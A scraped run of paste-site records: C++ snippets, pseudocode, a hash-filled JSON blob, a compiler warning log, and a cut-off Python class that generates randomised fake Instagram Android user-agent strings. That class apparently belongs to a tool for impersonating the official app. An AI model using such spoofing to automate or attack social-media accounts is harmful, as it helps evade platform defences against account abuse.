        // чтобы вычислить проценты, мы умножаем на литерал 100. типа double;
        // целочисленное значение функции CountPops при этом автоматически
        // преобразуется к double, как и i
        double rate = CountPops(reversed_bits, 0, i) * 100. / i;
        cout << ""After ""s << i << "" bits we found ""s << rate << ""% pops""s
            << endl;
    }
    const chrono::steady_clock::time_point end_time_counting = chrono::steady_clock::now();

    const chrono::steady_clock::duration duration_counting = end_time_counting - start_time_counting;

    cerr << ""Append random: "" << std::chrono::duration_cast<std::chrono::milliseconds>(duration_append_random).count() << "" ms"" << endl;
    cerr << ""Reverse: "" << std::chrono::duration_cast<std::chrono::milliseconds>(duration_reverse_vector).count() << "" ms"" << endl;
    cerr << ""Counting: "" << std::chrono::duration_cast<std::chrono::milliseconds>(duration_counting).count() << "" ms"" << endl;
}

int main() {
    Operate();
    return 0;
}"
q2eZMTNc,change %20 to space in a string,pasholnahuy,C++,Wednesday 13th of March 2024 07:16:05 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <unordered_set>

using namespace std;

int main() {
    string s;
    cin >> s;
    int ind = 0;
    int i = 0;
    while (i < s.size()){
        if (s.size() - i >= 2 && s.substr(i, 3) == ""%20""){
            s[i] = ' ';
            s[i+1] = '@';
            s[i+2] = '@';
            ++ind;
            i += 3;
        } else {
            ++i;
        }
    }
    ind = 0;
    for (int j = 0; j < s.size(); ++j){
        if (s[j] != '@'){
            swap(s[j], s[ind]);
            ++ind;
        }
    }
    while (!s.empty() && s.back() == '@'){
        s.pop_back();
    }
    cout << s;
}"
cCL8xvWA,Untitled,EAbdel,C#,Wednesday 13th of March 2024 07:13:03 AM CDT,"if IsBegin:
	Read options...
	Initialise Last Ship Mode
	Initialise Last Ship Mode Date 
	Initialise empty list of doubles (List<double> list = new List<double>();
	

If ShipMode has Evol AND ShipMode has Value:
	If Last ShipMode != NaN: // We have a previous ship mode
		If Last ShipMode != Current ShipMode: // IF shipmode has changed.
			Create a new output Object (obj)
			Duration = Last ShipMode Date - Current Date
			obj[mode] = ship_mode from options mapping
			obj[length] = Duration
			obj[""conso_spe""] = new Object()
			obj[""conso_spe""][""mea""] = list.mea //
			Output[t] = obj; // add result to output data
			...

	If Last ShipMode != Current ShipMode: // If ship mode has changed or first time we see one.
		// Renitialise the variables
		last ShipMode = current ShipMode
		last ShipMode Date = current ShipMode Date
		list = new List<double>(); // Or list.clear() to clear the list.

If Index has Evol AND Index has Value:
	// Add the current index value to the list for future computation
	list.append(Index.Value[t].Value;
"
yu1PDCRa,data867,TestGuy1,JSON,Wednesday 13th of March 2024 07:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '0f382a601772ef30fd46ff4dbec9311c552cdd01a8edfeb413c20e9ee09f86baf90536b4de753417ccba1a0838a1d2750a1b9dddcbe0ebb9001d9cf67522adae5e0b515f39c889f8e107bc8c7707190effa3fd842099d453a20a62d22c8ade3213f41d0c96558ba264518d22493ac8dc8ceeeac4493278f9e267dac4e306310a',
  otherdata: [
    '19abb2361217eb0529f75d33d0e40265',
    '38a0f6764de579fcc9b81709e229c918',
    '1caaf23c340f5eca60149dacd9b8aecc',
    '94fe8efba315f1424ddcfd2fbd030e30',
    '2ef5f81540529e4aec92751458773350',
    'f75c63a20549b638eaa257c0d3e3b599',
    '209579aacbe6fb9eecd7fe42b37e4e23',
    '0c49b3b3f5857ce4ab8ba88c4bf0795d'
  ]
}"
jJ4pgpDy,Untitled,mishakov,Bash,Wednesday 13th of March 2024 06:39:24 AM CDT,"cd /home/misha/pmos/lib/build/libc && /home/misha/cross/bin/x86_64-pmos-gcc   -Wall -Wextra -O2 -g -MD -MT libc/CMakeFiles/c.dir/src/generic/malloc/malloc.o -MF CMakeFiles/c.dir/src/generic/malloc/malloc.o.d -o CMakeFiles/c.dir/src/generic/malloc/malloc.o -c /home/misha/pmos/lib/libc/src/generic/malloc/malloc.c
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c: In function ‘ialloc.constprop’:
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:2273:33: warning: array subscript 0 is outside array bounds of ‘void[]’ [-Warray-bounds]
 2273 | #define chunksize(p)        ((p)->head & ~(FLAG_BITS))
      |                              ~~~^~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:5063:20: note: in expansion of macro ‘chunksize’
 5063 |   remainder_size = chunksize(p);
      |                    ^~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:831:32: note: at offset -16 into object of size [0, 9223372036854775807] allocated by ‘malloc’
  831 | #define dlmalloc               malloc
      |                                ^
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:3839:31: note: in expansion of macro ‘dlmalloc’
 3839 | #define internal_malloc(m, b) dlmalloc(b)
      |                               ^~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:5055:9: note: in expansion of macro ‘internal_malloc’
 5055 |   mem = internal_malloc(m, size - CHUNK_OVERHEAD);
      |         ^~~~~~~~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c: In function ‘internal_memalign.constprop’:
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:2273:33: warning: array subscript 0 is outside array bounds of ‘void[]’ [-Warray-bounds]
 2273 | #define chunksize(p)        ((p)->head & ~(FLAG_BITS))
      |                              ~~~^~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:4957:26: note: in expansion of macro ‘chunksize’
 4957 |         size_t newsize = chunksize(p) - leadsize;
      |                          ^~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:831:32: note: at offset -16 into object of size [0, 9223372036854775807] allocated by ‘malloc’
  831 | #define dlmalloc               malloc
      |                                ^
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:3839:31: note: in expansion of macro ‘dlmalloc’
 3839 | #define internal_malloc(m, b) dlmalloc(b)
      |                               ^~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:4936:11: note: in expansion of macro ‘internal_malloc’
 4936 |     mem = internal_malloc(m, req);
      |           ^~~~~~~~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:3063:21: warning: array subscript 0 is outside array bounds of ‘void[]’ [-Warray-bounds]
 3063 |   ((p)->head = (((p)->head & PINUSE_BIT)|s|CINUSE_BIT),\
      |                  ~~~^~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:4965:11: note: in expansion of macro ‘set_inuse’
 4965 |           set_inuse(m, p, leadsize);
      |           ^~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:831:32: note: at offset -16 into object of size [0, 9223372036854775807] allocated by ‘malloc’
  831 | #define dlmalloc               malloc
      |                                ^
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:3839:31: note: in expansion of macro ‘dlmalloc’
 3839 | #define internal_malloc(m, b) dlmalloc(b)
      |                               ^~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:4936:11: note: in expansion of macro ‘internal_malloc’
 4936 |     mem = internal_malloc(m, req);
      |           ^~~~~~~~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:3063:14: warning: array subscript 0 is outside array bounds of ‘void[]’ [-Warray-bounds]
 3063 |   ((p)->head = (((p)->head & PINUSE_BIT)|s|CINUSE_BIT),\
      |    ~~~~~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:4965:11: note: in expansion of macro ‘set_inuse’
 4965 |           set_inuse(m, p, leadsize);
      |           ^~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:831:32: note: at offset -16 into object of size [0, 9223372036854775807] allocated by ‘malloc’
  831 | #define dlmalloc               malloc
      |                                ^
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:3839:31: note: in expansion of macro ‘dlmalloc’
 3839 | #define internal_malloc(m, b) dlmalloc(b)
      |                               ^~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:4936:11: note: in expansion of macro ‘internal_malloc’
 4936 |     mem = internal_malloc(m, req);
      |           ^~~~~~~~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:4960:30: warning: array subscript 0 is outside array bounds of ‘void[]’ [-Warray-bounds]
 4960 |           newp->prev_foot = p->prev_foot + leadsize;
      |                             ~^~~~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:831:32: note: at offset -16 into object of size [0, 9223372036854775807] allocated by ‘malloc’
  831 | #define dlmalloc               malloc
      |                                ^
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:3839:31: note: in expansion of macro ‘dlmalloc’
 3839 | #define internal_malloc(m, b) dlmalloc(b)
      |                               ^~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:4936:11: note: in expansion of macro ‘internal_malloc’
 4936 |     mem = internal_malloc(m, req);
      |           ^~~~~~~~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c: In function ‘calloc’:
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:2271:34: warning: array subscript 0 is outside array bounds of ‘void[]’ [-Warray-bounds]
 2271 | #define is_mmapped(p)       (((p)->head & INUSE_BITS) == 0)
      |                                  ^~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:2308:32: note: in expansion of macro ‘is_mmapped’
 2308 | #define calloc_must_clear(p) (!is_mmapped(p))
      |                                ^~~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:4830:19: note: in expansion of macro ‘calloc_must_clear’
 4830 |   if (mem != 0 && calloc_must_clear(mem2chunk(mem)))
      |                   ^~~~~~~~~~~~~~~~~
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:831:32: note: at offset -16 into object of size [0, 9223372036854775807] allocated by ‘malloc’
  831 | #define dlmalloc               malloc
      |                                ^
/home/misha/pmos/lib/libc/src/generic/malloc/malloc.c:4829:9: note: in expansion of macro ‘dlmalloc’
 4829 |   mem = dlmalloc(req);"
VVwwy9dz,PremiumNoMenu,PapiGemezs,PHP,Wednesday 13th of March 2024 06:35:09 AM CDT,"{
   ""PremiumNoMenu"": [
      {
         ""version"": 1.4
      }
   ]
}"
4jxmQn9B,112.215.167.101-/sdcard/Premium/useragent.py.py,OBF-XIn,Python,Wednesday 13th of March 2024 06:20:38 AM CDT,"# useragent
import random

class Useragent:
    def __init__(self) -> None:
        pass
        
    def useragent_api(self):
        self.nexus = ['Galaxy Nexus', 'Nexus 10', 'Nexus 2', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 5', 'phone/Nexus 5', 'Nexus 5X', 'Nexus 6', 'Nexus 7', 'Nexus 9', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus Player', 'Nexus Player', 'Nexus S', 'Nexus S', 'Nexus S 4G', 'nexus S', 'Nexus S', 'Nexus s', 'Nexus S', 'Nexus S', 'Nexus S', 'Nexus S', 'Nexus S']
        self.micromax = ['Micromax 10', 'Micromax 1J', 'Micromax 86519', 'Micromax A064', 'Micromax_A064', 'Micromax A065', 'Micromax_A065', 'Micromax A066', 'Micromax_A066', 'Micromax A067', 'Micromax_A067', 'MICROMAX_A068', 'MICROMAX A068', 'Micromax A068', 'Micromax A069', 'Micromax_A069', 'Micromax A075', 'Micromax A082', 'Micromax_A082', 'Micromax A089', 'Micromax_A089', 'Micromax A091', 'Micromax A092', 'Micromax_A092', 'Micromax A093', 'Micromax_A093', 'Micromax A095', 'Micromax A096', 'Micromax_A101', 'Micromax A102', 'Micromax_A102', 'Micromax A104', 'Micromax a104', 'Micromax A105', 'Micromax_A105', 'Micromax A106', 'Micromax-A106', 'Micromax A108', 'Micromax_A109', 'Micromax A109', 'Micromax A110', 'Micromax_A110', 'Micromax A110Q', 'Micromax_A110Q', 'Micromax A111', 'Micromax A114', 'Micromax A114R', 'Micromax_A114R', 'Micromax A115', 'Micromax_A115', 'Micromax A116', 'Micromax_A116', 'Micromax A116i', 'Micromax_A116i', 'Micromax A117', 'Micromax_A117', 'Micromax A118R', 'Micromax A119', 'Micromax A120', 'Micromax A121', 'Micromax_A121', 'Micromax A15', 'Micromax A177', 'Micromax A190', 'Micromax_A190', 'Micromax A200', 'Micromax_A200', 'Micromax A21', 'Micromax A210', 'Micromax A24', 'Micromax_A24', 'Micromax A25 Smarty', 'Micromax A250', 'Micromax A255', 'Micromax_A255', 'Micromax A26', 'Micromax_A26', 'Micromax_A27', 'Micromax A27', 'Micromax_A28', 'Micromax A28/GRI40', 'Micromax A28', 'Micromax A290', 'Micromax A30', 'Micromax A300', 'Micromax A310', 'Micromax A311', 'Micromax A315', 'Micromax_A315', 'Micromax_A316', 'Micromax A316', 'Micromax_A34', 'Micromax A34', 'Micromax_A35', 'Micromax A35', 'Micromax A350', 'Micromax_A36', 'Micromax A36', 'Micromax_A37', 'Micromax A37', 'Micromax A37B', 'Micromax_A37B', 'Micromax A40', 'Micromax_A40', 'Micromax A46', 'Micromax_A46', 'Micromax A47', 'MicromaxA47', 'Micromax_A50', 'Micromax A50', 'Micromax A51', 'Micromax A52', 'Micromax A54', 'Micromax A56', 'Micromax_A57', 'Micromax A57', 'Micromax A58', 'Micromax_A58', 'Micromax A59', 'Micromax A60', 'Micromax A61', 'Micromax A62', 'Micromax_A62', 'Micromax A63', 'Micromax_A63', 'Micromax_A65', 'Micromax A65', 'Micromax_A66', 'Micromax A66', 'Micromax A67', 'Micromax A68', 'Micromax A69', 'Micromax_A69', 'Micromax_A70', 'Micromax A700', 'Micromax A71', 'Micromax_A71', 'Micromax A72', 'Micromax_A72', 'Micromax A73', 'Micromax_A74', 'Micromax A74', 'Micromax A75', 'Micromax_A76', 'Micromax A76', 'Micromax A77', 'Micromax A78', 'Micromax A79', 'en_us Micromax A80', 'Micromax A80', 'Micromax A82', 'Micromax_A82', 'Micromax A84', 'Micromax A85', 'Micromax A86', 'Micromax_A86', 'Micromax_A87', 'Micromax A87', 'Micromax A87 . Ninja 4.0', 'Micromax A88', 'Micromax_A88', 'Micromax A89', 'Micromax A90', 'Micromax A90s', 'MIcromax_A90s', 'Micromax A90S', 'Micromax A91', 'Micromax_A91', 'Micromax_A92', 'Micromax A92', 'MicromaxA93', 'Micromax A93', 'Micromax A94', 'Micromax_A94', 'Micromax A96', 'Micromax_A96', 'Micromax A97', 'Micromax_A99', 'Micromax A99', 'Micromax_AD3520', 'Micromax AD3520', 'Micromax AD3550', 'Micromax AD4500', 'Micromax_AD4500', 'Micromax AE90', 'Micromax AO5510', 'Micromax AQ5000', 'Micromax B4A', 'Micromax B5 Pro', 'B5Pro', 'Micromax_Bharat_5_Plus', 'Micromax Q402Plus', 'Micromax Q440', 'Micromax Bharat 5', 'Micromax Q4204', 'Micromax Bharat 5 Plus', 'Micromax Bharat 5 Pro', 'Micromax Bolt 3425', 'Micromax Bolt 2', 'Micromax Q402+', 'Micromax Q306', 'Micromax Q3001', 'Micromax Q301', 'Micromax Q303', 'Micromax Q324', 'Micromax Q326', 'Q327', 'Micromax Q327', 'Micromax Q3301', 'Micromax Q333', 'Micromax_Q333', 'Micromax Q338', 'Micromax Q346', 'Micromax Q354', 'Micromax Q357', 'Micromax Q383', 'Micromax_S302', 'Micromax S302', 'Micromax Q424', 'Micromax Q352', 'Micromax Q4101', 'Micromax C2A', 'Micromax C9', 'Micromax C1', 'Micromax C1A', 'Micromax C2APLS', 'Micromax Q4310', 'Micromax E4815', 'arm_64 Micromax E481', 'Micromax E481', 'Micromax E4816', 'Micromax Q462', 'Micromax Q463', 'Micromax E485', 'Micromax E484', 'Micromax AQ4501', 'Micromax AQ4502', 'A240', 'Micromax A240', 'Micromax Q391', 'Micromax E453', 'Micromax A107', 'Micromax HS2', 'Micromax HS1', 'Micromax_HS3', 'en Micromax_HS3', 'AQ5001', 'Micromax AQ5001', 'AQ5001 Canvas Power', 'Micromax Q392', 'Micromax Q465', 'Micromax Q461', 'Micromax Q350R', 'Micromax Q421', 'Micromax Q417', 'Micromax Q426', 'Micromax Q4260', 'Micromax E311', 'Micromax E352', 'Micromax E455', 'Micromax Q415', 'Micromax Q355', 'Micromax Q469', 'Micromax E451', 'Micromax E451', 'Micromax Q340', 'Micromax Q349', 'Micromax Q345', 'Micromax Q450', 'Micromax Q480', 'arm_64 Micromax Q480', 'Micromax Q380', 'Micromax Q3502', 'Micromax Q351', 'Micromax Q385', 'P70221', 'Micromax P681', 'MicromaxP802', 'Micromax Q427', 'Micromax_Q427', 'Micromax Q413', 'Micromax E313', 'Micromax D2', 'Micromax D200', 'Micromax_D200', 'Micromax D303', 'Micromax D304', 'Micromax_D304', 'Micromax D305', 'Micromax D306', 'Micromax D320', 'Micromax D321', 'Micromax D333', 'Micromax D340', 'Micromax D7517', 'Micromax DM5003', 'Micromax E353', 'Micromax E457', 'Micromax E458', 'Micromax E460', 'Micromax E471', 'Micromax E4817', 'Micromax E482', 'Micromax E483', 'Micromax E5018M', 'Micromax EG111', 'Micromax EG116', 'micromax F', 'micromax F189', 'Micromax F601', 'MicromaxF666', 'Micromax IN', 'Micromax E7533', 'Micromax E6523', 'IN_2b', 'IN_Note1', 'MICROMAX IN1', 'N8216', 'N8301', 'ione note', 'MICROMAX ione note', 'Micromax N4120', 'Micromax N8202', 'Micromax Ninja', 'Micromax Nitro', 'Micromax Note 1+', 'Micromax Note 5', 'Micromax Note3', 'Micromax NX', 'Micromax P001', 'Micromax P250(Funbook)', 'Micromax P255', 'Micromax P256', 'xx Micromax P275', 'Micromax_P275', 'Micromax P275', 'Micromax P280', 'Micromax P290', 'Micromax P310', 'Micromax P350', 'xx Micromax P350', 'Micromax P360', 'Micromax P362', 'Micromax P365', 'Micromax P410', 'Micromax P410i', 'Micromax_P410i', 'Micromax P420', 'Micromax P469', 'Micromax P470', 'MicromaxP480', 'Micromax P500(Funbook)', 'Micromax P560', 'Micromax P580', 'Micromax P580i', 'Micromax P600', 'Micromax P650', 'Micromax P650E', 'Micromax P660', 'Micromax P660', 'Micromax_P666', 'Micromax P666', 'MicromaxP680', 'Micromax P690', 'Micromax P701', 'MicromaxP702', 'Micromax P810', 'en Micromax Q300', 'Micromax_Q300', 'Micromax Q323', 'Micromax_Q323', 'Micromax Q325', 'Micromax_Q325', 'Micromax Q331', 'Micromax_Q331', 'Micromax Q332', 'Micromax_Q332', 'Micromax Q334', 'Micromax Q335', 'Micromax_Q335', 'Micromax Q336', 'Micromax_Q336', 'Micromax Q341', 'Micromax Q343', 'Micromax Q348', 'Micromax_Q353', 'en Micromax_Q353', 'Micromax_Q353P', 'Micromax Q3551', 'Micromax Q3555', 'Micromax Q361', 'Micromax Q370', 'Micromax_Q370', 'Micromax Q371', 'Micromax_Q371', 'Micromax Q375', 'Micromax_Q375', 'Micromax Q379', 'Micromax Q381', 'Micromax Q382', 'Micromax Q386', 'Micromax Q394', 'Micromax_Q394', 'Micromax Q395', 'Micromax Q397', 'Micromax Q398', 'arm Micromax Q398', 'Micromax Q400', 'Micromax_Q400', 'Micromax Q4002', 'en Micromax Q4002', 'Micromax Q401', 'Micromax Q402', 'Micromax Q402 Ultra', 'Micromax Q404', 'Micromax Q411', 'Micromax_Q411', 'Micromax Q412', 'Micromax Q414', 'Micromax Q416', 'Micromax Q419', 'Micromax Q4201', 'Micromax Q422', 'Micromax Q4220', 'Micromax Q423', 'Micromax Q428', 'Micromax_Q428', 'Micromax Q429', '720X1280 Micromax Q4309', 'Micromax Q4312', 'en_US Micromax Q437', 'Micromax Q440Plus', 'Micromax Q454', 'Micromax Q470', 'Micromax Q479', 'Micromax Q491', 'Micromax_Q491', 'Micromax Q502+', 'Micromax Q666', 'Micromax Q67', 'micromax Q68', 'micromax Q78', 'Micromax S300', 'Micromax_S300', 'Micromax S301', 'Micromax_S301', 'Micromax Q4311', 'Micromax Q4601', 'Micromax Q409A', 'Micromax Q409', 'Micromax Q452', 'Micromax Unite 3', 'Micromax Unite 2', 'Micromax Unite 2 A106', 'Micromax Q372', 'Micromax V89', 'Micromax Q4001', 'Micromax Q4202', 'Micromax Q4251', 'arm Micromax Q4251', 'Micromax W5509', 'Micromax X5098', 'Micromax-Xzoom A52', 'YU5530', 'YU5040', 'Micromax YU5900', 'YU5012', 'Micromax Z59']
        self.onpls = ['NE2213', 'NE2217', 'NE2215', 'NE2210', 'NE2210', 'CPH2423', 'CPH2411', 'CPH2417', 'CPH2413', 'CPH2415', 'CPH2449', 'CPH2487', 'ONE A2003', 'ONE A2003', 'ONE A2001', 'ONE A2005', 'ONEPLUS A3003', 'ONEPLUS A3000', 'ONEPLUS A3010', 'ONEPLUS A5000', 'ONEPLUS A5000', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A6003', 'ONEPLUS A6000', 'ONEPLUS A6010', 'ONEPLUS A6013', 'ONEPLUS A6010', 'GM1900', 'GM1901', 'GM1903', 'GM1917', 'GM1913', 'GM1911', 'GM1910', 'GM1915', 'GM1910', 'HD1901', 'HD1903', 'HD1900 Flow', 'HD1905', 'HD1900', 'HD1907', 'HD1911', 'HD1913', 'HD1910', 'GM1925', 'HD1925', 'GM1920', 'IN2013', 'IN2015', 'IN2010', 'IN2010', 'IN2017', 'IN2019', 'IN2023', 'IN2025', 'IN2020', 'OnePlus8Pro', 'KB2005', 'KB2001', 'KB2007', 'KB2003', 'KB2000', 'OnePlus 8T 5G', 'LE2115', 'LE2113', 'LE2111', 'LE2110', 'LE2120', 'LE2125', 'LE2123', 'LE2121', 'LE2127', 'OnePlus9Pro', 'LE2101', 'LE2100', 'MT2111', 'MT2110', 'ONEPLUS A19677', 'ONEPLUS A2345', 'Oneplus A31', 'Oneplus A3331', 'ONEPLUS A35904', 'ONEPLUS A37000', 'ONEPLUS A3EVB', 'ONEPLUS A62322', 'ONEPLUS A64794', 'ONEPLUS A65369', 'ONEPLUS A68333', 'ONEPLUS A70458', 'ONEPLUS A70791', 'ONEPLUS A78637', 'ONEPLUS A80828', 'ONEPLUS A83306', 'ONEPLUS A87046', 'ONEPLUS A90641', 'Oneplus A99831', 'PGKM10', 'PGKM10', 'PHK110', 'PHK110', 'PGP110', 'PGP110', 'PGZ110', 'ONEPLUS KB2023', 'OnePlus Nord', 'Oneplus Nord 2', 'DN2103', 'DN2101', 'CPH2399', 'CPH2401', 'AC2001', 'AC2003', 'IV2201', 'CPH2409', 'CPH2381', 'CPH2465', 'EB2103', 'EB2101', 'EB2101', 'BE2025', 'BE2026', 'BE2029', 'Nord N10 5G', 'BE2028', 'BE2013', 'BE2011', 'BE2012', 'CPH2459', 'GN2200', 'CPH2469', 'DE2118', 'DE2117', 'A0001', 'ONE E1001', 'ONE E1003', 'ONE E1001', 'ONE E1005']
        self.dix = random.choice(['114.0.0.20.2','114.0.0.38.120','114.0.0.20.70','114.0.0.28.120','114.0.0.0.24','114.0.0.0.41'])
        self.dpi_pxl = random.choice(['240dpi; 1760x792', '240dpi; 1920x864', '320dpi; 2400x1080', '400dpi; 3200x1440', '480dpi; 1080x1920', '320dpi; 900x1600', '320dpi; 720x1280', '240dpi; 540x960', '280dpi; 1920x1080', '240dpi; 160x900', '240dpi; 1280x720', '160dpi; 960x540'])
        self.dvc = random.choice([""30/11"",""31/12"",""29/10""])
        return(random.choice([
            f'Instagram {self.dix} Android ({self.dvc}; 160dpi; 623x1280; NEXUS MOBILITY LIMITED/Nexus; {str(random.choice(self.nexus))}; qcom; in_ID; 158441914)',
            f'Instagram {self.dix} Android ({self.dvc}; 160dpi; 623x1280; MICROMAX MOBILITY LIMITED/Micromax; {str(random.choice(self.micromax))}; qcom; in_ID; 158441914)',
            f'Instagram {self.dix} Android ({self.dvc}; 160dpi; 623x1280; ONEPLUS MOBILITY LIMITED/One; {str(random.choice(self.onpls))}; qcom; in_ID; 158441914)',
           ])
       )
        
    def useragent_ajax(self):
        self.micromax = ['Micromax 10', 'Micromax 1J', 'Micromax 86519', 'Micromax A064', 'Micromax_A064', 'Micromax A065', 'Micromax_A065', 'Micromax A066', 'Micromax_A066', 'Micromax A067', 'Micromax_A067', 'MICROMAX_A068', 'MICROMAX A068', 'Micromax A068', 'Micromax A069', 'Micromax_A069', 'Micromax A075', 'Micromax A082', 'Micromax_A082', 'Micromax A089', 'Micromax_A089', 'Micromax A091', 'Micromax A092', 'Micromax_A092', 'Micromax A093', 'Micromax_A093', 'Micromax A095', 'Micromax A096', 'Micromax_A101', 'Micromax A102', 'Micromax_A102', 'Micromax A104', 'Micromax a104', 'Micromax A105', 'Micromax_A105', 'Micromax A106', 'Micromax-A106', 'Micromax A108', 'Micromax_A109', 'Micromax A109', 'Micromax A110', 'Micromax_A110', 'Micromax A110Q', 'Micromax_A110Q', 'Micromax A111', 'Micromax A114', 'Micromax A114R', 'Micromax_A114R', 'Micromax A115', 'Micromax_A115', 'Micromax A116', 'Micromax_A116', 'Micromax A116i', 'Micromax_A116i', 'Micromax A117', 'Micromax_A117', 'Micromax A118R', 'Micromax A119', 'Micromax A120', 'Micromax A121', 'Micromax_A121', 'Micromax A15', 'Micromax A177', 'Micromax A190', 'Micromax_A190', 'Micromax A200', 'Micromax_A200', 'Micromax A21', 'Micromax A210', 'Micromax A24', 'Micromax_A24', 'Micromax A25 Smarty', 'Micromax A250', 'Micromax A255', 'Micromax_A255', 'Micromax A26', 'Micromax_A26', 'Micromax_A27', 'Micromax A27', 'Micromax_A28', 'Micromax A28/GRI40', 'Micromax A28', 'Micromax A290', 'Micromax A30', 'Micromax A300', 'Micromax A310', 'Micromax A311', 'Micromax A315', 'Micromax_A315', 'Micromax_A316', 'Micromax A316', 'Micromax_A34', 'Micromax A34', 'Micromax_A35', 'Micromax A35', 'Micromax A350', 'Micromax_A36', 'Micromax A36', 'Micromax_A37', 'Micromax A37', 'Micromax A37B', 'Micromax_A37B', 'Micromax A40', 'Micromax_A40', 'Micromax A46', 'Micromax_A46', 'Micromax A47', 'MicromaxA47', 'Micromax_A50', 'Micromax A50', 'Micromax A51', 'Micromax A52', 'Micromax A54', 'Micromax A56', 'Micromax_A57', 'Micromax A57', 'Micromax A58', 'Micromax_A58', 'Micromax A59', 'Micromax A60', 'Micromax A61', 'Micromax A62', 'Micromax_A62', 'Micromax A63', 'Micromax_A63', 'Micromax_A65', 'Micromax A65', 'Micromax_A66', 'Micromax A66', 'Micromax A67', 'Micromax A68', 'Micromax A69', 'Micromax_A69', 'Micromax_A70', 'Micromax A700', 'Micromax A71', 'Micromax_A71', 'Micromax A72', 'Micromax_A72', 'Micromax A73', 'Micromax_A74', 'Micromax A74', 'Micromax A75', 'Micromax_A76', 'Micromax A76', 'Micromax A77', 'Micromax A78', 'Micromax A79', 'en_us Micromax A80', 'Micromax A80', 'Micromax A82', 'Micromax_A82', 'Micromax A84', 'Micromax A85', 'Micromax A86', 'Micromax_A86', 'Micromax_A87', 'Micromax A87', 'Micromax A87 . Ninja 4.0', 'Micromax A88', 'Micromax_A88', 'Micromax A89', 'Micromax A90', 'Micromax A90s', 'MIcromax_A90s', 'Micromax A90S', 'Micromax A91', 'Micromax_A91', 'Micromax_A92', 'Micromax A92', 'MicromaxA93', 'Micromax A93', 'Micromax A94', 'Micromax_A94', 'Micromax A96', 'Micromax_A96', 'Micromax A97', 'Micromax_A99', 'Micromax A99', 'Micromax_AD3520', 'Micromax AD3520', 'Micromax AD3550', 'Micromax AD4500', 'Micromax_AD4500', 'Micromax AE90', 'Micromax AO5510', 'Micromax AQ5000', 'Micromax B4A', 'Micromax B5 Pro', 'B5Pro', 'Micromax_Bharat_5_Plus', 'Micromax Q402Plus', 'Micromax Q440', 'Micromax Bharat 5', 'Micromax Q4204', 'Micromax Bharat 5 Plus', 'Micromax Bharat 5 Pro', 'Micromax Bolt 3425', 'Micromax Bolt 2', 'Micromax Q402+', 'Micromax Q306', 'Micromax Q3001', 'Micromax Q301', 'Micromax Q303', 'Micromax Q324', 'Micromax Q326', 'Q327', 'Micromax Q327', 'Micromax Q3301', 'Micromax Q333', 'Micromax_Q333', 'Micromax Q338', 'Micromax Q346', 'Micromax Q354', 'Micromax Q357', 'Micromax Q383', 'Micromax_S302', 'Micromax S302', 'Micromax Q424', 'Micromax Q352', 'Micromax Q4101', 'Micromax C2A', 'Micromax C9', 'Micromax C1', 'Micromax C1A', 'Micromax C2APLS', 'Micromax Q4310', 'Micromax E4815', 'arm_64 Micromax E481', 'Micromax E481', 'Micromax E4816', 'Micromax Q462', 'Micromax Q463', 'Micromax E485', 'Micromax E484', 'Micromax AQ4501', 'Micromax AQ4502', 'A240', 'Micromax A240', 'Micromax Q391', 'Micromax E453', 'Micromax A107', 'Micromax HS2', 'Micromax HS1', 'Micromax_HS3', 'en Micromax_HS3', 'AQ5001', 'Micromax AQ5001', 'AQ5001 Canvas Power', 'Micromax Q392', 'Micromax Q465', 'Micromax Q461', 'Micromax Q350R', 'Micromax Q421', 'Micromax Q417', 'Micromax Q426', 'Micromax Q4260', 'Micromax E311', 'Micromax E352', 'Micromax E455', 'Micromax Q415', 'Micromax Q355', 'Micromax Q469', 'Micromax E451', 'Micromax E451', 'Micromax Q340', 'Micromax Q349', 'Micromax Q345', 'Micromax Q450', 'Micromax Q480', 'arm_64 Micromax Q480', 'Micromax Q380', 'Micromax Q3502', 'Micromax Q351', 'Micromax Q385', 'P70221', 'Micromax P681', 'MicromaxP802', 'Micromax Q427', 'Micromax_Q427', 'Micromax Q413', 'Micromax E313', 'Micromax D2', 'Micromax D200', 'Micromax_D200', 'Micromax 